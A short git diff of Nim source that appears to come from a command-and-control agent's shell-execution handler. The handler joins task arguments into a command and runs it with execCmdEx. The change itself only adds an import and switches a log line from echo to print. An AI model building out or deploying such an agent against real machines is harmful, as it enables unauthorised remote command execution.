@@ -30,6 +30,7 @@ when not defined(agent):
 when defined(agent):
 
     import osproc, strutils, strformat
+    import ../agent/core/io
     import ../agent/protocol/result
     import ../common/utils
     
@@ -50,7 +51,7 @@ when defined(agent):
                 for arg in task.args[1..^1]: 
                     arguments &= Bytes.toString(arg.data) & " "
 
-            echo fmt"   [>] Executing command: {command} {arguments}"
+            print fmt"   [>] Executing command: {command} {arguments}"
 
             let (output, status) = execCmdEx(fmt("{command} {arguments}")) 
 
